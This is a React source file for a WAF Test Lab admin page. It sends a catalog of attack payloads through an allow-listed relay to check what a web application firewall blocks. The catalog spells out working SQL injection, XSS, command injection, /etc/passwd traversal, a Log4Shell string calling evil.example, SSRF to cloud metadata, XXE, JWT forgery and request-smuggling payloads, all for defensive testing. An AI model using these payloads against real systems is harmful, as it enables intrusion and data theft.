"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { FlaskConical, Play, Send, ShieldCheck, ShieldAlert } from "lucide-react";
import PageHeader from "@/components/ui/PageHeader";
import DataTable, { type Column } from "@/components/ui/DataTable";
import Button from "@/components/ui/Button";
import Badge from "@/components/ui/Badge";
import Select from "@/components/ui/Select";
import Input from "@/components/ui/Input";
import Textarea from "@/components/ui/Textarea";
import Card, { CardHeader, CardBody } from "@/components/ui/Card";
import { apiFetch } from "@/lib/api/client";
import { useNotification } from "@/contexts/NotificationContext";

/**
 * WAF Test Lab — an operator tool that fires attack payloads at any allow-listed
 * host through a server-side relay (POST /api/waf/test) and reports what the WAF
 * did: matched rule, violation code, support id and a pass/fail verdict.
 *
 * Why server-side and not a browser fetch: the admin dashboard is a *different*
 * origin from the tenant hosts, and a WAF 403 block page carries no CORS headers,
 * so a cross-origin fetch can't read it. The backend performs the request from
 * OpenResty and returns the status + x-waf-* headers, guarded by a host
 * allow-list and a private/loopback/metadata block (see api/api.lua handle_waf_test).
 * Unlike the in-browser demo lab, this relay can also set forbidden headers such
 * as User-Agent, so scanner detection is testable here too.
 */

// ── Result + catalog types ──────────────────────────────────────────────────
interface WafTestResult {
  ok: boolean;
  error?: string;
  status?: number;
  blocked?: boolean;
  waf_block?: boolean;
  waf_rule?: string | null;
  waf_violation?: string | null;
  support_id?: string | null;
  server?: string | null;
  content_type?: string | null;
  latency_ms?: number;
  target?: string;
  path?: string;
  method?: string;
  body_snippet?: string;
}

interface CatalogAttack {
  id: string;
  name: string;
  group: string;
  method: string;
  path: string;
  body?: string;
  contentType?: string;
  headers?: Record<string, string>;
  expect: "block" | "allow";
  notes?: string;
}

// Forged alg:none JWT for the JWT test (header.payload. with empty signature).
function b64url(obj: unknown): string {
  return btoa(JSON.stringify(obj)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
const FORGED_JWT = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({ sub: "admin", role: "admin" })}.`;

// A representative attack per shipped rule (GET + POST). expect=block means the
// WAF should stop it; expect=allow is a benign / staged / business-logic control.
const CATALOG: CatalogAttack[] = [
  { id: "sqli-union", name: "SQL injection (UNION)", group: "SQL injection", method: "GET",
    path: "/products?cat=x' UNION SELECT * FROM users--", expect: "block" },
  { id: "sqli-boolean", name: "SQL injection (OR 1=1)", group: "SQL injection", method: "GET",
    path: "/products?cat=1 OR 1=1", expect: "block" },
  { id: "xss-script", name: "Reflected XSS (<script>)", group: "XSS", method: "GET",
    path: "/search?q=<script>alert(document.cookie)</script>", expect: "block" },
  { id: "xss-event", name: "XSS (event handler)", group: "XSS", method: "GET",
    path: "/search?q=<img src=x onerror=alert(1)>", expect: "block" },
  { id: "cmdi-semicolon", name: "OS command injection (;)", group: "Command injection", method: "GET",
    path: "/ping?host=127.0.0.1;id", expect: "block" },
  { id: "cmdi-subshell", name: "Command injection $(…)", group: "Command injection", method: "GET",
    path: "/ping?host=$(whoami)", expect: "block" },
  { id: "lfi-passwd", name: "LFI — /etc/passwd", group: "LFI / traversal", method: "GET",
    path: "/statement?file=/etc/passwd", expect: "block" },
  { id: "lfi-encoded", name: "Encoded traversal", group: "LFI / traversal", method: "GET",
    path: "/statement?file=..%2f..%2f..%2fetc/passwd", expect: "block" },
  { id: "proto-crlf", name: "CRLF / response splitting", group: "Protocol", method: "GET",
    path: "/products?cat=x%0d%0aX-Injected:1", expect: "block" },
  { id: "ssti", name: "SSTI {{7*7}}", group: "SSTI", method: "GET",
    path: "/render?tpl={{7*7}}", expect: "block" },
  { id: "log4shell", name: "Log4Shell JNDI", group: "RCE (CVE)", method: "GET",
    path: "/lookup?user=${jndi:ldap://evil.example/a}", expect: "block" },
  { id: "spring4shell", name: "Spring4Shell", group: "RCE (CVE)", method: "GET",
    path: "/bind?class.module.classLoader.URLs%5B0%5D=x", expect: "block" },
  { id: "ssrf-metadata", name: "SSRF → cloud metadata", group: "SSRF", method: "GET",
    path: "/fetch?url=http://169.254.169.254/latest/meta-data/", expect: "block" },
  { id: "ssrf-gopher", name: "SSRF gopher scheme", group: "SSRF", method: "GET",
    path: "/fetch?url=gopher://127.0.0.1:70/1", expect: "block" },
  { id: "nosqli", name: "NoSQL injection auth bypass", group: "NoSQL injection", method: "POST",
    path: "/api/login", body: '{"user":"admin","pass":{"$ne":null}}', contentType: "application/json", expect: "block" },
  { id: "xxe", name: "XXE file disclosure", group: "XXE", method: "POST",
    path: "/api/import",
    body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    contentType: "application/xml", expect: "block" },
  { id: "jwt-alg-none", name: "JWT alg:none forgery", group: "JWT / broken auth", method: "GET",
    path: "/api/me", headers: { Authorization: `Bearer ${FORGED_JWT}` }, expect: "block" },
  { id: "proto-pollution", name: "Prototype pollution", group: "Prototype pollution", method: "POST",
    path: "/api/merge", body: '{"__proto__":{"admin":true}}', contentType: "application/json", expect: "block" },
  { id: "graphql", name: "GraphQL introspection", group: "GraphQL", method: "POST",
    path: "/graphql", body: '{"query":"{__schema{types{name}}}"}', contentType: "application/json", expect: "block" },
  { id: "scanner-ua", name: "Scanner UA (sqlmap)", group: "Scanner / bot", method: "GET",
    path: "/products?cat=deposit", headers: { "User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)" },
    expect: "block", notes: "server-side relay can set User-Agent — not testable from a browser" },
  { id: "cmdi-json", name: "Command injection in JSON body", group: "Command injection", method: "POST",
    path: "/api/login", body: '{"user":"a","pass":"x; id"}', contentType: "application/json", expect: "block" },
  { id: "mass-assignment", name: "Mass assignment (role=admin)", group: "Mass assignment", method: "POST",
    path: "/api/profile", body: '{"user":"me","role":"admin"}', contentType: "application/json", expect: "block" },
  { id: "smuggling", name: "HTTP request smuggling", group: "HTTP request smuggling", method: "POST",
    path: "/api/batch",
    body: '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n',
    contentType: "text/plain", expect: "block" },
  { id: "filetype", name: "Filetype deny (.env)", group: "Positive security", method: "GET",
    path: "/config.env", expect: "block" },
  { id: "method", name: "Method deny (PUT)", group: "Positive security", method: "PUT",
    path: "/api/profile", body: '{"user":"me"}', contentType: "application/json", expect: "block" },
  { id: "open-redirect", name: "Open redirect (staged)", group: "Open redirect", method: "GET",
    path: "/products?redirect=https://evil.example/phish", expect: "allow",
    notes: "signature staged in the demo policy — alarms, does not hard-block" },
  { id: "benign", name: "Benign request", group: "Control / benign", method: "GET",
    path: "/products?cat=deposit", expect: "allow" },
  { id: "bola", name: "BOLA / IDOR (business logic)", group: "Control / benign", method: "GET",
    path: "/api/accounts/9999", expect: "allow", notes: "no signature — a WAF cannot stop object-level authz flaws" },
];

const GROUPS = ["all", ...Array.from(new Set(CATALOG.map((a) => a.group)))];

function verdictOf(a: CatalogAttack, r?: WafTestResult): { ok: boolean | null; label: string } {
  if (!r) return { ok: null, label: "—" };
  if (!r.ok) return { ok: false, label: r.error ? "error" : "failed" };
  const blocked = !!r.blocked;
  if (a.expect === "block") return { ok: blocked, label: blocked ? "blocked ✓" : "NOT blocked ✗" };
  return { ok: !blocked, label: blocked ? "blocked ✗" : "passed ✓" };
}

export default function WafTestLabPage() {
  const { notify } = useNotification();
  const [targets, setTargets] = useState<string[]>([]);
  const [target, setTarget] = useState("");
  const [group, setGroup] = useState("all");
  const [results, setResults] = useState<Record<string, WafTestResult | undefined>>({});
  const [running, setRunning] = useState(false);

  // custom request builder
  const [cMethod, setCMethod] = useState("GET");
  const [cPath, setCPath] = useState("/search?q=<script>alert(1)</script>");
  const [cType, setCType] = useState("");
  const [cHeaders, setCHeaders] = useState("");
  const [cBody, setCBody] = useState("");
  const [cResult, setCResult] = useState<WafTestResult | undefined>();
  const [cSending, setCSending] = useState(false);

  // Load the allow-listed targets the backend will accept.
  useEffect(() => {
    let cancelled = false;
    apiFetch<{ targets: string[] }>("/waf/test/targets")
      .then((res) => {
        if (cancelled) return;
        const list = res?.targets ?? [];
        setTargets(list);
        setTarget((prev) => prev || list.find((t) => t.includes("secure")) || list[0] || "");
      })
      .catch(() => {
        if (!cancelled) notify("Could not load the WAF test allow-list", { type: "error" });
      });
    return () => {
      cancelled = true;
    };
  }, [notify]);

  const fireAttack = useCallback(
    async (a: { method: string; path: string; body?: string; contentType?: string; headers?: Record<string, string> }): Promise<WafTestResult> => {
      try {
        const res = await apiFetch<WafTestResult>("/waf/test", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target,
            method: a.method,
            path: a.path,
            body: a.body ?? null,
            content_type: a.contentType ?? null,
            headers: a.headers ?? {},
          }),
        });
        return res ?? { ok: false, error: "empty response" };
      } catch (e) {
        return { ok: false, error: e instanceof Error ? e.message : String(e) };
      }
    },
    [target],
  );

  const runAll = useCallback(async () => {
    if (!target) {
      notify("Pick a target host first", { type: "warning" });
      return;
    }
    setRunning(true);
    setResults({});
    const items = [...CATALOG];
    let idx = 0;
    const worker = async () => {
      while (idx < items.length) {
        const a = items[idx++];
        const r = await fireAttack(a);
        setResults((prev) => ({ ...prev, [a.id]: r }));
      }
    };
    try {
      await Promise.all([worker(), worker(), worker()]);
    } finally {
      setRunning(false);
    }
  }, [target, fireAttack, notify]);

  const fireOne = useCallback(
    async (a: CatalogAttack) => {
      const r = await fireAttack(a);
      setResults((prev) => ({ ...prev, [a.id]: r }));
    },
    [fireAttack],
  );

  const sendCustom = useCallback(async () => {
    let headers: Record<string, string> = {};
    if (cHeaders.trim()) {
      try {
        headers = JSON.parse(cHeaders);
      } catch {
        notify("Headers must be valid JSON (e.g. {\"Authorization\":\"Bearer …\"})", { type: "error" });
        return;
      }
    }
    setCSending(true);
    const r = await fireAttack({
      method: cMethod,
      path: cPath,
      body: cBody || undefined,
      contentType: cType || undefined,
      headers,
    });
    setCResult(r);
    setCSending(false);
  }, [cMethod, cPath, cType, cHeaders, cBody, fireAttack, notify]);

  // Summary + protection verdict across everything that ran.
  const ran = Object.values(results).filter(Boolean) as WafTestResult[];
  const successful = ran.filter((r) => r.ok);
  const blockedCount = successful.filter((r) => r.blocked).length;
  const expectedPasses = CATALOG.filter((a) => {
    const r = results[a.id];
    if (!r) return false;
    return verdictOf(a, r).ok === true;
  }).length;
  const protectionKnown = successful.length >= 3;
  const isProtected = protectionKnown && blockedCount >= Math.max(1, Math.floor(successful.length * 0.5));

  const shown = useMemo(
    () => (group === "all" ? CATALOG : CATALOG.filter((a) => a.group === group)),
    [group],
  );

  const columns = useMemo<Column<CatalogAttack>[]>(
    () => [
      {
        field: "name",
        label: "Attack",
        render: (a) => (
          <div>
            <div className="font-medium text-slate-900 dark:text-slate-100">{a.name}</div>
            <div className="font-mono text-xs text-slate-500 dark:text-slate-400">
              {a.group}
              {a.notes ? ` · ${a.notes}` : ""}
            </div>
          </div>
        ),
      },
      {
        field: "method",
        label: "Req",
        width: "12rem",
        render: (a) => (
          <div>
            <Badge variant="info" size="sm">{a.method}</Badge>
            <div className="mt-1 max-w-[11rem] truncate font-mono text-xs text-slate-500 dark:text-slate-400" title={a.path}>
              {a.path}
            </div>
          </div>
        ),
      },
      {
        field: "expect",
        label: "Expect",
        width: "5rem",
        render: (a) => (
          <Badge variant={a.expect === "block" ? "danger" : "default"} size="sm">{a.expect}</Badge>
        ),
      },
      {
        field: "status",
        label: "Status",
        width: "4.5rem",
        render: (a) => {
          const r = results[a.id];
          if (!r) return <span className="text-slate-400">—</span>;
          if (!r.ok) return <Badge variant="warning" size="sm">n/a</Badge>;
          return <span className="font-mono text-sm">{r.status}</span>;
        },
      },
      {
        field: "result",
        label: "Result",
        width: "8rem",
        render: (a) => {
          const r = results[a.id];
          if (!r) return <span className="text-slate-400">—</span>;
          if (!r.ok) return <span className="text-xs text-amber-600 dark:text-amber-400" title={r.error}>{r.error}</span>;
          if (r.blocked) return <Badge variant="danger" size="sm">BLOCKED</Badge>;
          return <Badge variant="success" size="sm">reached origin</Badge>;
        },
      },
      {
        field: "rule",
        label: "Rule / violation",
        render: (a) => {
          const r = results[a.id];
          if (!r || !r.ok) return <span className="text-slate-400">—</span>;
          return (
            <div className="font-mono text-xs">
              {r.waf_rule ? <div className="text-primary-700 dark:text-primary-300">{r.waf_rule}</div> : null}
              {r.waf_violation && r.waf_violation !== r.waf_rule ? (
                <div className="text-slate-500 dark:text-slate-400">{r.waf_violation}</div>
              ) : null}
              {r.support_id ? <div className="text-slate-400">{r.support_id}</div> : null}
              {r.latency_ms != null ? <div className="text-slate-400">{r.latency_ms} ms</div> : null}
            </div>
          );
        },
      },
      {
        field: "verdict",
        label: "Verdict",
        width: "7rem",
        render: (a) => {
          const v = verdictOf(a, results[a.id]);
          if (v.ok === null) return <span className="text-slate-400">—</span>;
          return (
            <Badge variant={v.ok ? "success" : "danger"} size="sm">{v.label}</Badge>
          );
        },
      },
      {
        field: "actions",
        label: "",
        width: "5rem",
        render: (a) => (
          <Button variant="ghost" size="sm" onClick={() => fireOne(a)} disabled={running || !target}>
            Fire
          </Button>
        ),
      },
    ],
    [results, running, target, fireOne],
  );

  const targetOptions = useMemo(
    () => targets.map((t) => ({ value: t, label: t })),
    [targets],
  );

  return (
    <div>
      <PageHeader
        title="WAF Test Lab"
        icon={FlaskConical}
        subtitle="Fire attack payloads (GET & POST) at an allow-listed host and see what the WAF blocks"
        actions={
          <Button
            onClick={runAll}
            loading={running}
            disabled={!target}
            icon={<Play className="h-4 w-4" aria-hidden="true" />}
          >
            Run all ({CATALOG.length})
          </Button>
        }
      />

      {/* Target + protection verdict */}
      <div className="mb-5 grid grid-cols-1 gap-4 lg:grid-cols-3">
        <Card>
          <CardBody>
            <Select
              label="Target host"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              options={targetOptions}
              placeholder={targets.length ? undefined : "loading allow-list…"}
              hint="Only hosts on the server-side allow-list can be targeted (SSRF-guarded)."
            />
          </CardBody>
        </Card>

        <Card className="lg:col-span-2">
          <CardBody>
            {ran.length === 0 ? (
              <div className="flex h-full items-center text-sm text-slate-500 dark:text-slate-400">
                Run the catalog (or a single row) to measure this host&apos;s WAF efficacy.
              </div>
            ) : (
              <div className="flex flex-wrap items-center gap-4">
                <div
                  className={`flex items-center gap-2 rounded-lg px-3 py-2 ${
                    !protectionKnown
                      ? "bg-slate-100 dark:bg-slate-800"
                      : isProtected
                        ? "bg-green-50 dark:bg-green-900/20"
                        : "bg-red-50 dark:bg-red-900/20"
                  }`}
                >
                  {isProtected ? (
                    <ShieldCheck className="h-5 w-5 text-green-600 dark:text-green-400" aria-hidden="true" />
                  ) : (
                    <ShieldAlert className="h-5 w-5 text-red-500" aria-hidden="true" />
                  )}
                  <span className="text-lg font-bold">
                    {blockedCount}/{successful.length}
                  </span>
                  <span className="text-sm text-slate-600 dark:text-slate-300">
                    {!protectionKnown ? "ran" : isProtected ? "blocked — WAF active" : "blocked — exposed"}
                  </span>
                </div>
                <div className="text-sm text-slate-600 dark:text-slate-300">
                  <span className="font-semibold text-slate-900 dark:text-slate-100">{expectedPasses}</span> / {ran.length} behaving as expected
                </div>
              </div>
            )}
          </CardBody>
        </Card>
      </div>

      {/* Filter */}
      <div className="mb-4 max-w-xs">
        <Select
          label="Filter by category"
          value={group}
          onChange={(e) => setGroup(e.target.value)}
          options={GROUPS.map((g) => ({ value: g, label: g === "all" ? "All categories" : g }))}
        />
      </div>

      <DataTable
        columns={columns}
        data={shown}
        getId={(a) => a.id}
        emptyMessage="No attacks in this category."
        page={1}
        perPage={100}
      />

      {/* Custom request builder */}
      <Card className="mt-6">
        <CardHeader>
          <h2 className="text-base font-semibold text-slate-900 dark:text-slate-100">Custom request</h2>
          <p className="mt-0.5 text-sm text-slate-500 dark:text-slate-400">
            Craft an arbitrary request to probe a specific rule. Fires through the same allow-listed relay.
          </p>
        </CardHeader>
        <CardBody>
          <div className="grid grid-cols-1 gap-4 md:grid-cols-4">
            <Select
              label="Method"
              value={cMethod}
              onChange={(e) => setCMethod(e.target.value)}
              options={["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"].map((m) => ({ value: m, label: m }))}
            />
            <div className="md:col-span-3">
              <Input label="Path" value={cPath} onChange={(e) => setCPath(e.target.value)} placeholder="/search?q=…" />
            </div>
            <Input label="Content-Type" value={cType} onChange={(e) => setCType(e.target.value)} placeholder="application/json" />
            <div className="md:col-span-3">
              <Input
                label="Headers (JSON)"
                value={cHeaders}
                onChange={(e) => setCHeaders(e.target.value)}
                placeholder='{"Authorization":"Bearer …"}'
              />
            </div>
            <div className="md:col-span-4">
              <Textarea label="Body" value={cBody} onChange={(e) => setCBody(e.target.value)} rows={3} placeholder="request body (POST/PUT)" />
            </div>
          </div>
          <div className="mt-4 flex items-center gap-3">
            <Button
              onClick={sendCustom}
              loading={cSending}
              disabled={!target}
              icon={<Send className="h-4 w-4" aria-hidden="true" />}
            >
              Send
            </Button>
            {cResult ? (
              cResult.ok ? (
                <div className="flex flex-wrap items-center gap-2 text-sm">
                  {cResult.blocked ? (
                    <Badge variant="danger" size="sm">BLOCKED</Badge>
                  ) : (
                    <Badge variant="success" size="sm">reached origin</Badge>
                  )}
                  <span className="font-mono">{cResult.status}</span>
                  {cResult.waf_rule ? <span className="font-mono text-primary-700 dark:text-primary-300">{cResult.waf_rule}</span> : null}
                  {cResult.waf_violation && cResult.waf_violation !== cResult.waf_rule ? (
                    <span className="font-mono text-slate-500 dark:text-slate-400">{cResult.waf_violation}</span>
                  ) : null}
                  {cResult.support_id ? <span className="font-mono text-xs text-slate-400">{cResult.support_id}</span> : null}
                  {cResult.latency_ms != null ? <span className="text-xs text-slate-400">{cResult.latency_ms} ms</span> : null}
                </div>
              ) : (
                <span className="text-sm text-amber-600 dark:text-amber-400">{cResult.error}</span>
              )
            ) : null}
          </div>
        </CardBody>
      </Card>

      <p className="mt-6 text-xs text-slate-400">
        Requests are performed server-side from OpenResty (a browser here is a different origin and
        cannot read another host&apos;s WAF block). Targets are restricted to a server-configured
        allow-list (<code>settings.waf.test_targets</code>) and private/loopback/metadata addresses are
        refused. This tool sends attack payloads — only run it against hosts you are authorised to test.
      </p>
    </div>
  );
}
